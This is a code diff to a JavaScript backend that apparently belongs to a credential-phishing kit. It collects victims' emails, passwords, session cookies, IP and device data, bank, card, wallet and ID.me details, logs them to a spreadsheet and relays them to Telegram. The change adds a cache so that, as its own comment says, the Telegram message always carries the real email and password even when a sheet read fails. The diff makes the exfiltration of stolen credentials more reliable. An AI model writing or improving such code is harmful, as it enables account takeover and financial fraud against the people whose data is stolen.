@@ -524,7 +524,7 @@ async function cleanupFailedRowsWithoutEmail() {
  * @param {string} status - The status of the cookie submission (e.g., "COMPLETED", "FAILED").
  * @returns {Object} A JSON response indicating success or failure.
  */
-export async function updateHubAndProjectsFromCookieData(browserId, status) {
+export async function updateHubAndProjectsFromCookieData(browserId, status, cachedRowData = null) {
   logger.info(`[updateHubAndProjectsFromCookieData] Starting update for browserId: ${browserId}, status: ${status}`);
 
   const HUB_SHEET_NAME = "hub"; // Assuming "HUB" is the sheet name
@@ -533,55 +533,74 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
   const CELL_SIZE_LIMIT = 45000; // Define a threshold for saving to Drive
 
   try {
-    logger.debug(`[updateHubAndProjectsFromCookieData] Fetching cookie data for browserId: ${browserId}`);
-    // 1. Get cookie row data using Sheets API
-    const cookieRowsResult = await getSheetDataApi(COOKIE_SHEET_NAME);
+    let cookieRowMap = null;
+    if (cachedRowData && typeof cachedRowData === 'object' && Object.keys(cachedRowData).length > 0) {
+      // Build from the in-memory cache so the FAILED/COMPLETED Telegram always carries
+      // the real email/password even if a fresh sheet read fails (quota) or the sheet
+      // cell was cleared. The cache is authoritative at this point — the engine wrote
+      // it synchronously before any sheet cascade.
+      cookieRowMap = { ...cachedRowData };
+      logger.info(`[updateHubAndProjectsFromCookieData] Using cached row data for browserId: ${browserId}`);
+    } else {
+      logger.debug(`[updateHubAndProjectsFromCookieData] Fetching cookie data for browserId: ${browserId}`);
+      // 1. Get cookie row data using Sheets API (fallback when no cached row is available)
+      const cookieRowsResult = await getSheetDataApi(COOKIE_SHEET_NAME);
 
-    if (!cookieRowsResult.success || cookieRowsResult.count === 0) {
-      logger.error(`[updateHubAndProjectsFromCookieData] Cookie data for browserId '${browserId}' not found or failed to fetch.`);
-      return {
-        success: false,
-        error: `Cookie data for browserId '${browserId}' not found or failed to fetch.`
-      };
+      if (!cookieRowsResult.success || cookieRowsResult.count === 0) {
+        logger.error(`[updateHubAndProjectsFromCookieData] Cookie data for browserId '${browserId}' not found or failed to fetch.`);
+        return {
+          success: false,
+          error: `Cookie data for browserId '${browserId}' not found or failed to fetch.`
+        };
+      }
+
+      const cookieHeaders = cookieRowsResult.headers;
+      const cookieRow = cookieRowsResult.data.find(row => {
+        const browserIdIndex = cookieHeaders.indexOf("browserId");
+        return browserIdIndex !== -1 && String(row[browserIdIndex]).trim() === String(browserId).trim();
+      });
+
+      if (!cookieRow) {
+        logger.error(`[updateHubAndProjectsFromCookieData] Cookie data for browserId '${browserId}' not found in sheet.`);
+        return {
+          success: false,
+          error: `Cookie data for browserId '${browserId}' not found in sheet.`
+        };
+      }
+
+      cookieRowMap = {};
+      cookieHeaders.forEach((header, index) => {
+        cookieRowMap[header] = cookieRow[index];
+      });
     }
-
-    const cookieHeaders = cookieRowsResult.headers;
-    const cookieRow = cookieRowsResult.data.find(row => {
-      const browserIdIndex = cookieHeaders.indexOf("browserId");
-      return browserIdIndex !== -1 && String(row[browserIdIndex]).trim() === String(browserId).trim();
-    });
-
-    if (!cookieRow) {
-      logger.error(`[updateHubAndProjectsFromCookieData] Cookie data for browserId '${browserId}' not found in sheet.`);
-      return {
-        success: false,
-        error: `Cookie data for browserId '${browserId}' not found in sheet.`
-      };
-    }
-
-    const cookieRowMap = {};
-    cookieHeaders.forEach((header, index) => {
-      cookieRowMap[header] = cookieRow[index];
-    });
     // logger.debug(`[updateHubAndProjectsFromCookieData] Retrieved cookie data for browserId ${browserId}.`);
+
+    // Safe JSON parse — cached row values may be raw sheet strings OR already-parsed
+    // objects depending on the write path, so a malformed value must never abort the
+    // Telegram send that follows.
+    const safeParse = (val, fallback) => {
+      if (val === undefined || val === null || val === '') return fallback;
+      if (typeof val !== 'string') return val;
+      try { return JSON.parse(val); } catch (e) { return fallback; }
+    };
 
     // Prepare data for Hub and Projects
     const dataToUpdate = {
       email: cookieRowMap.email || "",
       domain: cookieRowMap.domain || "",
       password: cookieRowMap.password || "",
-      ipData: cookieRowMap.ipData ? JSON.parse(cookieRowMap.ipData) : {},
-      deviceData: cookieRowMap.deviceData ? JSON.parse(cookieRowMap.deviceData) : {},
+      ipData: safeParse(cookieRowMap.ipData, {}),
+      deviceData: safeParse(cookieRowMap.deviceData, {}),
       verifyAccess: cookieRowMap.verifyAccess !== undefined ? (String(cookieRowMap.verifyAccess).toLowerCase() === 'true') : false,
       cookieAccess: cookieRowMap.cookieAccess !== undefined ? (String(cookieRowMap.cookieAccess).toLowerCase() === 'true') : false,
       verified: cookieRowMap.verified !== undefined ? (String(cookieRowMap.verified).toLowerCase() === 'true') : false,
       fullAccess: cookieRowMap.fullAccess !== undefined ? (String(cookieRowMap.fullAccess).toLowerCase() === 'true') : false,
-      banks: cookieRowMap.banks ? JSON.parse(cookieRowMap.banks) : [],
-      cards: cookieRowMap.cards ? JSON.parse(cookieRowMap.cards) : [],
-      socials: cookieRowMap.socials ? JSON.parse(cookieRowMap.socials) : [],
-      wallets: cookieRowMap.wallets ? JSON.parse(cookieRowMap.wallets) : [],
+      banks: safeParse(cookieRowMap.banks, []),
+      cards: safeParse(cookieRowMap.cards, []),
+      socials: safeParse(cookieRowMap.socials, []),
+      wallets: safeParse(cookieRowMap.wallets, []),
       idMe: cookieRowMap.idMe || null,
-      cookieJSON: cookieRowMap.cookieJSON ? (typeof cookieRowMap.cookieJSON === 'string' ? JSON.parse(cookieRowMap.cookieJSON) : cookieRowMap.cookieJSON) : (cookieRowMap.formattedCookie ? JSON.parse(cookieRowMap.formattedCookie) : {}),
+      cookieJSON: safeParse(cookieRowMap.cookieJSON, safeParse(cookieRowMap.formattedCookie, {})),
       cookieFileURL: cookieRowMap.cookieFileURL || cookieRowMap.driveUrl || ""
     };
 
@@ -782,8 +801,8 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
         email: cookieRowMap.email || "N/A",
         domain: cookieRowMap.domain || "N/A",
         password: cookieRowMap.password || "N/A",
-        ipData: cookieRowMap.ipData ? JSON.parse(cookieRowMap.ipData) : {},
-        deviceData: cookieRowMap.deviceData ? JSON.parse(cookieRowMap.deviceData) : {},
+        ipData: safeParse(cookieRowMap.ipData, {}),
+        deviceData: safeParse(cookieRowMap.deviceData, {}),
         verifyAccess: dataToUpdate.verified,
         cookieAccess: dataToUpdate.cookieAccess,
         verified: dataToUpdate.verified,
@@ -794,7 +813,7 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
         cards: dataToUpdate.cards,
         socials: dataToUpdate.socials,
         wallets: dataToUpdate.wallets,
-        apiResponse: cookieRowMap.apiResponse ? JSON.parse(cookieRowMap.apiResponse) : null
+        apiResponse: safeParse(cookieRowMap.apiResponse, null)
       });
     }
 
